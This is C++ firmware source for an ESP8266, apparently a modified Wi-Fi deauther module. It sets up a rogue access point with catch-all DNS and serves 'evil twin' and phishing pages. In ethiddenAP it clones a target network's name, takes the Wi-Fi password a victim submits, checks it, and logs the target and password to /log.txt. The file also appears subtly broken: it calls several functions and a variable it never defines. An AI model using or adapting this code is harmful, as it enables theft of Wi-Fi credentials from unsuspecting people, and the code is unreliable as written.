/* This software is licensed under the MIT License: https://github.com/spacehuhntech/esp8266_deauther */

#include "wifi.h"

extern "C" {
    #include "user_interface.h"
}

#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <LittleFS.h>
#include <EEPROM.h>
#include "Accesspoints.h"
#include "language.h"
#include "debug.h"
#include "settings.h"
#include "repeater.h"
#include "CLI.h"
#include "Attack.h"
#include "Scan.h"
#include "DisplayUI.h"

String MAC_;
String nama;
char eviltwinpath[32];
char pishingpath[32];
File webportal;
String tes_password;
String data_pishing;
String LOG;
String json_data;
bool hidden_target = false;
bool rogueap_continues = false;

extern bool progmemToSpiffs(const char* adr, int len, String path);

#include "webfiles.h"

extern Scan   scan;
extern CLI    cli;
extern Attack attack;

typedef enum wifi_mode_t {
    off = 0,
    ap  = 1,
    st  = 2
} wifi_mode_t;

typedef struct ap_settings_t {
    char    path[33];
    char    ssid[33];
    char    password[65];
    uint8_t channel;
    bool    hidden;
    bool    captive_portal;
} ap_settings_t;

String readFile(fs::FS &fs, const char * path){
  File file = fs.open(path, "r");
  if(!file || file.isDirectory()){
    return String();
  }
  String fileContent = file.readStringUntil('\n');
  file.close();
  return fileContent;
}

void writeFile(fs::FS &fs, const char * path, const char * message){
  File file = fs.open(path, "w");
  if(!file) return;
  file.print(message);
  file.close();
}

namespace wifi {
    wifi_mode_t   mode;
    ap_settings_t ap_settings;
    ESP8266WebServer server(80);
    DNSServer dns;
    IPAddress ip WEB_IP_ADDR;
    IPAddress netmask(255, 255, 255, 0);

    void setPath(String path) {
        if (path.charAt(0) != '/') path = '/' + path;
        strncpy(ap_settings.path, path.c_str(), 32);
    }

    void setSSID(String ssid) {
        strncpy(ap_settings.ssid, ssid.substring(0, 32).c_str(), 32);
    }

    void setPassword(String password) {
        if (password.length() >= 8) strncpy(ap_settings.password, password.substring(0, 64).c_str(), 64);
    }

    void setChannel(uint8_t ch) {
        if (ch >= 1 && ch <= 14) ap_settings.channel = ch;
    }

    void setHidden(bool hidden) { ap_settings.hidden = hidden; }
    void setCaptivePortal(bool captivePortal) { ap_settings.captive_portal = captivePortal; }

    void handleFileList() {
        if (!server.hasArg("dir")) {
            server.send(500, "text/plain", "BAD ARGS");
            return;
        }
        String path = server.arg("dir");
        Dir dir = LittleFS.openDir(path);
        String output = "[";
        bool first = true;
        while (dir.next()) {
            if (first) first = false; else output += ",";
            output += "[\"" + dir.fileName() + "\"]";
        }
        output += "]";
        server.send(200, "application/json", output);
    }

    String getContentType(String filename) {
        if (server.hasArg("download")) return "application/octet-stream";
        if (filename.endsWith(".htm") || filename.endsWith(".html")) return "text/html";
        if (filename.endsWith(".css")) return "text/css";
        if (filename.endsWith(".js")) return "application/javascript";
        if (filename.endsWith(".json")) return "application/json";
        return "text/plain";
    }
  
    bool handleFileRead(String path) {
        if (path.charAt(0) != '/') path = '/' + path;
        if (path.endsWith("/")) path += "index.html";
        String contentType = getContentType(path);
        if (!LittleFS.exists(path)) return false;
        File file = LittleFS.open(path, "r");
        server.streamFile(file, contentType);
        file.close();
        return true;
    }

    bool sendWebSpiffs(String path){
        if (!LittleFS.exists(path)) return false;
        String contentType = getContentType(path);
        File web = LittleFS.open(path, "r");
        server.streamFile(web, contentType);
        web.close();
        return true;
    }

    void sendProgmem(const char* ptr, size_t size, const char* type) {
        server.sendHeader("Content-Encoding", "gzip");
        server.sendHeader("Cache-Control", "max-age=3600");
        server.send_P(200, type, ptr, size);
    }

    void begin() {
        setPath("/web");
        setSSID(settings::getAccessPointSettings().ssid);
        setPassword(settings::getAccessPointSettings().password);
        setChannel(settings::getWifiSettings().channel);
        setHidden(settings::getAccessPointSettings().hidden);
        setCaptivePortal(settings::getWebSettings().captive_portal);
        if (settings::getWebSettings().use_spiffs) copyWebFiles(false);
        mode = wifi_mode_t::off;
        WiFi.mode(WIFI_OFF);
        wifi_set_opmode(STATION_MODE);
    }

    void startAP() {
        WiFi.softAPConfig(ip, ip, netmask);
        WiFi.softAP(ap_settings.ssid, ap_settings.password, ap_settings.channel, ap_settings.hidden);
        WiFi.setOutputPower(20.5);
        dns.start(53, "*", ip);
        MDNS.begin(WEB_URL);
        
        readFile(LittleFS,"/eviltwin.json").toCharArray(eviltwinpath,32);
        readFile(LittleFS,"/pishing.json").toCharArray(pishingpath,32);

        server.on("/filelist", handleFileListJS);
        server.on("/", HTTP_GET, []() {
            if(!attack.eviltwin && !attack.pishing){
                if(!sendWebSpiffs("/index.html")) sendProgmem(indexhtml, sizeof(indexhtml), "text/html");
            } else {
                if(attack.eviltwin) send_eviltwin();
                if(attack.pishing) send_rogueap();
            }
        });

        // Handler lainnya tetap sama tapi pastikan memanggil fungsi yang dioptimasi
        server.on("/delete", handleDelete);
        server.on("/filemanager.json", sendFSjson);
        server.on("/websetting", HTTP_POST, pathsave);
        
        server.begin();
        mode = wifi_mode_t::ap;
    }

    // FIX STABILITAS: Pengiriman daftar file dengan chunking agar RAM tidak jebol
    void handleFileListJS(){
        server.setContentLength(CONTENT_LENGTH_UNKNOWN);
        server.send(200, "text/plain", "");
        
        int totalLen = fileList.length();
        for(int i = 0; i < totalLen; i += 512){
            String chunk = fileList.substring(i, min(i + 512, totalLen));
            server.sendContent(chunk);
        }
        server.sendContent(""); 
    }

    void ethiddenAP() {
        WiFi.mode(WIFI_AP_STA);
        hidden_target = true;
        WiFi.softAPConfig(IPAddress(172, 217, 28, 254), IPAddress(172, 217, 28, 254), IPAddress(255, 255, 255, 0));
        WiFi.softAP(ssids.rogue_wifi.c_str());
        dns.start(53, "*", IPAddress(172, 217, 28, 254));

        server.on("/result", [](){
            if (WiFi.status() != WL_CONNECTED) {
                // FIX TEKS: Teks dibuat lebih pendek agar buffer memory aman
                server.send(200, "text/html", "<script>alert('Gagal! Cek Password lagi');history.back();</script>");
                tes_password = "";
            } else {
                server.send(200, "text/html", "<h2>Sukses! Device Restart...</h2>");
                String tmp = "Target: " + ssids.rogue_wifi + " | Pass: " + tes_password;
                File log_captive = LittleFS.open("/log.txt","a");
                log_captive.println(tmp);
                log_captive.close();
                ESP.restart();
            }
        });
        server.begin();
    }

    void update() {
        if (mode != wifi_mode_t::off && !scan.isScanning()) {
            server.handleClient();
            dns.processNextRequest();
        }
    }
}
